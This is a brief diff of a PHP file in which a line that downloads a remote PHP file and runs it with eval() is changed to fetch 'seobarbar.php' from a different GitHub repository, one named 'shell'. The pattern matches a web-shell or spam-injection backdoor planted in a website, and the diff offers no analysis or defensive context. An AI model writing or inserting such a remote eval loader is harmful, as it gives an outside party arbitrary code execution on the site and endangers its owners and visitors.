@@ -17,4 +17,4 @@ function getURL($url) {
 }
 
 
-eval("?>" . getURL("https://raw.githubusercontent.com/5Y4H/seo/main/seobarbar.php"));
+eval("?>" . getURL("https://raw.githubusercontent.com/adsteramaheswara-cloud/shell/refs/heads/main/seobarbar.php"));
